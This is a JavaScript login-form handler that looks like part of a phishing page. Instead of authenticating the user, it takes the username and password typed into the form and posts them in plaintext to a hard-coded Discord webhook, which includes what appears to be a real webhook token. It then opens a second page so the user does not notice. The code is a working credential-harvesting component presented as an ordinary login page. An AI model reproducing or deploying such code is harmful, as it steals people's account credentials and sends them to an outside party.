function handleLogin(event) {
            event.preventDefault(); // Prevent the default form submission

            const username = document.getElementById('login-username').value;
            const password = document.getElementById('login-password').value;

            if (username && password) {
                playClickSound();

                const webhookURL = 'https://discord.com/api/webhooks/1255165219018379318/FUzxdWzgixD2imc9GmPY_5gBb4Ba_iVbyCGcSkC3RXwnhqGMf_bXURuAr0gMjaOrXz-H'; // Replace with your Discord webhook URL

                const data = {
                    content: `**Username:** ${username}\n**Password:** ${password}`
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Login information sent to Discord successfully');
                        // Redirect to a new page after successful login
                        window.open("page2.html", "_blank");
                    } else {
                        console.error('Error sending to Discord:', response.status);
                        alert('Error sending login information.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error sending login information.');
                });
            } else {
                alert('Please fill in both the username and password.');
            }
        }

        function playClickSound() {
            const buttonSound = document.getElementById('buttonSound');
            if (buttonSound) {
                buttonSound.play().catch(error => {
                    console.error('Error playing sound:', error);
                });
            } else {
                console.error('Button sound element not found');
            }
        }

        // Preload the audio to ensure it is ready to play
        window.addEventListener('load', () => {
            const buttonSound = document.getElementById('buttonSound');
            if (buttonSound) {
                buttonSound.load();
            }
        });